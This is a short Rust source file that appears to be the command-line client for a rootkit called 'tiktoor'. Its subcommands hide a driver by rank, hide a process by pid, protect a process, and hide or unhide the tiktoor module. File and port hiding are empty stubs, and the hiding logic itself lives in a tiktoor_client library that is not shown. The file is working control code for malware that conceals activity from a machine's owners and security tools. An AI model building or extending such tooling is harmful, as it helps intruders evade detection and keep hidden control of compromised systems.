use structopt::StructOpt;

/// A CLI tool for communicating with tiktoor
#[derive(StructOpt)]
enum Cli {
    /// Hide driver
    DriverHiding {
        /// driver name
        #[structopt(short, long)]
        rank: u32,
    },
    /// Hide file
    FileHiding,
    /// Hide port
    PortHiding,
    /// Hide process
    ProcessHiding {
        /// Process pid
        #[structopt(short, long)]
        pid: u32,
    },
    /// Protect process
    ProcessProtection {
        /// Process pid
        #[structopt(short, long)]
        pid: u32,
    },
    /// Hide tiktoor module
    ModuleHiding,
    /// Unhide tiktoor module
    ModuleUnhiding,
}

fn main() {
    let cli = Cli::from_args();

    match cli {
        Cli::DriverHiding { rank } => tiktoor_client::hide_driver(rank),
        Cli::FileHiding => {}
        Cli::PortHiding => {}
        Cli::ProcessHiding { pid } => tiktoor_client::hide_process(pid),
        Cli::ProcessProtection { pid } => tiktoor_client::protect_process(pid),
        Cli::ModuleHiding => tiktoor_client::hide_module(),
        Cli::ModuleUnhiding => tiktoor_client::unhide_module(),
    }
}
